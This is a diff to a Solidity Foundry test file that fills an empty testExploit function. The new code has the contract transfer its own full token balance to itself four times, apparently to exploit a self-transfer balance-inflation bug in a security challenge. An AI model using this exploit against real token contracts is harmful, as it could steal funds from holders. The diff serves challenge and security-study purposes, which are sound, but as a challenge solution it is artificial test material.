@@ -10,5 +10,10 @@ import {Test, console2} from "forge-std/Test.sol";
 import {GPUBaseTest} from "./GPUBase.t.sol";
 
 contract GPUTest is GPUBaseTest {
-    function testExploit() external validation {}
+    function testExploit() external validation {
+      for(uint i = 0; i < 4; i++) {
+        uint256 balance = token.balanceOf(address(this));
+        token.transfer(address(this), balance);
+      }
+    }
 }
